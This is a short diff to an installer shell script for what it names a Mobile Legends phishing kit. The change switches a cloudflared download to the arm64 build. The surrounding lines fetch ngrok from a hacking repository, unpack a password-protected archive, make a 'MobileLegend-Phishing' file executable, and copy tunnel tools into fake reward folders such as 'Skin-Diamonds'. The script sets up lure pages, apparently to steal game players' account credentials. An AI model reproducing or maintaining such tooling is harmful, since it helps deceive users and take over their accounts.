@@ -125,7 +125,7 @@ echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download L
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared-linux-arm
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
 echo""
 clear
 echo ""
@@ -138,7 +138,7 @@ wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/m
 unrar x -Password SUMAN.rar
 rm -rf SUMAN.rar
 chmod +x ngrok
-chmod +x cloudflared
+chmod +x cloudflared-linux-arm64
 chmod +x ML
 chmod +x MobileLegend
 clear
@@ -158,9 +158,9 @@ read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtok
 $token
 echo ""
 echo
-cp -R cloudflared-linux-arm ngrok .SUMAN/1-Skin-Diamonds/
-cp -R cloudflared-linux-arm ngrok .SUMAN/2-Event-Red/
-cp -R cloudflared-linux-arm ngrok .SUMAN/3-Event-Blue/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/1-Skin-Diamonds/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/2-Event-Red/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/3-Event-Blue/
 chmod 7777 MobileLegend-Phishing
 clear
 echo
